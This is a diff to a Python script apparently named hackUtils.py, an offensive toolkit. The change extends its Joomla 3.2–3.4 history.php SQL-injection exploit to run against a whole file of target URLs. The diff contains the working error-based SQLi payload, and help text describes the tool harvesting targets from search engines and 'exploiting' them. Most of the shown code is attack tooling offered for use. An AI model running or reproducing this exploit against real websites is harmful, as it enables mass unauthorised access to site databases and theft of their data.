@@ -326,9 +326,20 @@ def encryptStr(value):
     print "[*] SHA256: "+sha256
     print "[*] Base64: "+b64
     
-def checkJoomlaSQLi(url):
+def checkJoomla(value):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
     print "["+str(now)+"] [INFO] Checking Joomla 3.2.0 - 3.4.4 history.php SQLi..."
+    if 'http://' in value or 'https://' in value:
+    	url=value
+    	checkJoomlaSQLi(url)
+    else:
+    	urlfile=open(value,'r')
+    	for url in urlfile:
+    		checkJoomlaSQLi(url)
+    	urlfile.close()
+    
+def checkJoomlaSQLi(url):    
+    url = url.strip()
     poc = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6176666973686572),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     urlA=url+poc
     try:
@@ -376,7 +387,7 @@ def myhelp():
     print "  -b keyword, --baidu=keyword                         Fetch URLs from Baidu based on specific keyword"
     print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
     print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
-    print "  -j url, --joomla=url                                Exploit SQLi for Joomla 3.2 - 3.4"
+    print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
@@ -384,6 +395,7 @@ def myhelp():
     print "  hackUtils.py -g inurl:www.example.com"
     print "  hackUtils.py -w .php?id="
     print "  hackUtils.py -j http://www.joomla.com/"
+    print "  hackUtils.py -j urls.txt"
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
@@ -405,7 +417,7 @@ def main():
         if name in ("-w","--wooyun"):
             fetchUrls('wooyun',value,50)
         if name in ("-j","--joomla"):
-            checkJoomlaSQLi(value)
+            checkJoomla(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
